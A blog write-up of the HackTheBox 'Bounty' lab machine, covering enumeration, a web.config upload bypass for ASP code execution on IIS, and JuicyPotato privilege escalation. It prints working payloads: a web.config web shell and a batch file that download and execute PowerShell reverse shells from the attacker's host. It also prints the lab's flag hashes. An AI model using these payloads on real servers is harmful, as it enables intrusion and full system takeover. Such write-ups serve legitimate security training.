---
layout: post
title: HackTheBox Bounty 
date: 2018-06-16
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches. ([Source](https://www.hackthebox.com/machines/bounty))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# nmap -sC -sV -A -p- 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up (0.0065s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
OS details: Microsoft Windows Server 2008 R2 SP1
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   4.78 ms 10.10.14.1
2   5.29 ms 10.10.10.93

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.98 seconds
```

There seems to be only a web server running. Lets check it out!

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bounty/website.png?raw=true)

It seems like there’s nothing much here. Lets run `gobuster`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,js,html,txt,aspx
...
/transfer.aspx        (Status: 200) [Size: 941]
/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]      
/uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]           
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
... 
```

Oh? There’s an interesting `/transfer.aspx` page!

![transfer_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bounty/transfer_webpage.png?raw=true)

Ah, it looks like a page where we can upload something!

Here’s what I found after playing around with the upload page.

-   We can only upload certain file(s) like `png`.
-   We cannot access `/UploadedFiles`,`/uploadedFiles` or `/uploadedfiles/`.

Now what we can do here is to send the request packet to Burp Intruder and then enumerate the possible file extensions that we can submit.

![payload_position](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bounty/payload_position.png?raw=true)

![payload_options](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bounty/payload_options.png?raw=true)

The attack showed some of the following files can be uploaded.

```
gif, jpg, png, doc, config, jpeg, xls, xlsx, docx
```

Perhaps the most interesting file extension would be `config`.

Searching `web.config bypass upload restrictions` resulted in this [article](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) which showed that we can use this simple code to check if we can run the `config` file as an `ASP` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Lets try uploading this code to the server and navigate to  `/uploadfiles/web.config`.

![web_config_result](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bounty/web_config_result.png?raw=true)

Yay! It works~

# Exploit

Now, our next step is to formulate a plan to connect a reverse shell.

-   Grab a reverse shell from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
-   Host it on a local server using Python.
-   Launch a web shell (using this [guide](https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c)) on the `web.config` file to download our reverse shell and execute it.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# cat revshell.ps1        
...
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.23 -Port 1234

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# cat web.config   
...
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
Set shell = CreateObject("WScript.Shell")
Set cmd = shell.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.23:6969/revshell.ps1')")
Set output = cmd.StdOut.Readall()
Response.write(output)
%>
-->
```

>   Typically I would use port 80 but I used port 6969 because port 80 was used by Burp :(

Now that everything is ready , we can start a netcat listener and uploaded the malicious `web.config` file.

Thereafter, we view it on `http://10.10.10.93/uploadedfiles/web.config` to execute the malicious code.

```bash
- Local server -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
10.10.10.93 - - [08/Jul/2022 21:45:34] "GET /revshell.ps1 HTTP/1.1" 200 -

- Netcat listener -
┌──(root㉿shiro)-[/home/shiro]
└─# nc -nlvp 1234                            
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```

# Privilege Escalation

On a Windows machine, we should always run `systeminfo` to get more information about the system and then also run `whoami /priv` to check what privileges are enabled for the current user.

```bash
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          7/8/2022, 3:25:06 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,289 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,292 MB
Virtual Memory: In Use:    803 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
                                 
PS C:\windows\system32\inetsrv> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

It seems that `SeImpersonatePrivilege` is enabled. 

Googling for `seimpersonateprivilege exploit` resulted in this [article](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505).

Now lets craft our plan.

-   Download `JuicyPotato.exe` on local machine.
-   Host on local server.
-   Download and execute `JuicyPotato.exe` from netcat listener.

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
10.10.10.93 - - [08/Jul/2022 22:38:35] "GET /JuicyPotato.exe HTTP/1.1" 200 -

- Netcat listener -
PS C:\windows\system32\inetsrv>cd c:\users\merlin\desktop
PS C:\users\merlin\desktop> (new-object net.webclient).downloadfile('http://10.10.14.23:6969/JuicyPotato.exe', 'C:\Users\merlin\Desktop\jp.exe')
```

According to the JuicyPotato GitHub repository, here is how we can use the executable.

```bash
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

From what I understand, we can write a `.bat` program to for JuicyPotato to launch after executing.

So lets write a simple powershell script that downloads a reverse shell from our local server.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# cat exploit.bat                         
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.23:6969/revshell2.ps1')
```

Now, lets create the reverse shell and host the local server! 

Thereafter, we can grab the `exploit.bat` from our local server and execute `JuicyPotato.exe`!

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# cat revshell2.ps1
...
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.23 -Port 9999


┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
10.10.10.93 - - [08/Jul/2022 22:50:08] "GET /exploit.bat HTTP/1.1" 200 -
10.10.10.93 - - [08/Jul/2022 22:50:21] "GET /revshell2.ps1 HTTP/1.1" 200 -

- Netcat listener -
PS C:\users\merlin\desktop> (new-object net.webclient).downloadfile('http://10.10.14.23:6969/exploit.bat', 'C:\Users\merlin\Desktop\exploit.bat')

PS C:\users\merlin\desktop> ./jp.exe -t * -p exploit.bat -l 9696
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9696
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

- Another netcat listener -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
└─# nc -nlvp 9999                  
listening on [any] 9999 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.93] 49177
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system

PS C:\Windows\system32> type c:\users\merlin\desktop\user.txt
06831fefdd281c825b6ba52e51ac5a26

PS C:\Windows\system32> type c:\users\administrator\desktop\root.txt
d4ad739f4a8199ffea3b1149e40c121f
```

